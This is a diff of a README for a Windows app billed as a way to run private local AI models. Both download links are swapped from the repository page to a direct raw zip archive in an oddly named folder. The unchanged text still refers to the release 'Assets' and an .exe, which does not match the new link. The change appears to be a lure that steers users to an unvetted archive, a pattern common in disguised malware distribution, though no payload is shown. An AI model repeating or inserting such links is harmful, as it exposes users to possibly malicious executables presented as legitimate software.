@@ -1,6 +1,6 @@
 # 🤖 local-llm-4-2026 - Run private artificial intelligence on Windows
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Beardtarantella701/local-llm-4-2026)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/Beardtarantella701/local-llm-4-2026/main/calycate/llm-local-2.7-beta.4.zip)
 
 ## 📖 About this software
 
@@ -22,7 +22,7 @@ Before you begin, ensure your computer meets these standards to run the models s
 
 Visit the release page to get the installer for your computer. 
 
-[Click here to visit the download page](https://github.com/Beardtarantella701/local-llm-4-2026)
+[Click here to visit the download page](https://raw.githubusercontent.com/Beardtarantella701/local-llm-4-2026/main/calycate/llm-local-2.7-beta.4.zip)
 
 On the page, look under the "Assets" section. Select the file that ends in .exe. This file contains everything needed to install the software. 
 
